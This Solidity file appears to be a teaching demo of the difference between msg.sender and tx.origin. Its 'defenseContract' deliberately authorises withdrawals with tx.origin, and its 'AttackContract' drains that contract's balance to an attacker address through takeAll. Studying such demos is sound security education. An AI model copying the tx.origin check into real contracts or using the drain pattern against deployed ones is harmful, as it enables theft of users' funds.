// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

contract A {
    function a() public view returns(address){
        return msg.sender;
    }

    function b() public view returns(address){
        return address(this);
    }

    function c() public view returns(address){
        return tx.origin;
    }
}

contract B {
    A c_a;

    constructor(address _c){
        c_a = A(_c);
    }

    function a() public view returns(address){
        return c_a.a();
    }

    function b() public view returns(address){
        return c_a.b();
    }

    function c() public view returns(address){
        return c_a.c();
    }
}

contract defenseContract {

    address public owner;

    constructor (address _owner) {
        owner = _owner; // 배포와 함께 오너 설정
    }
    receive() external payable{}

    function withdrawAll(address account) public {
        require(tx.origin == owner);
        payable(account).transfer(address(this).balance);
    } // 모든 돈을 인출하는 함수

    function deposit(address account) public payable {
        payable(account).transfer(msg.value);
    }
}

contract AttackContract {

    defenseContract a;

    address attacker;   

    constructor (defenseContract _attackAddr, address _attackerAddress) {
        a = defenseContract(_attackAddr);
        attacker = _attackerAddress;
    }

    function deposit(address account) public payable {
        a.deposit(account);
    }

    function takeAll() public payable {
        a.withdrawAll(attacker);
    }

    function testEth(address aaa) public payable {
        payable(aaa).transfer(msg.value);
    }
}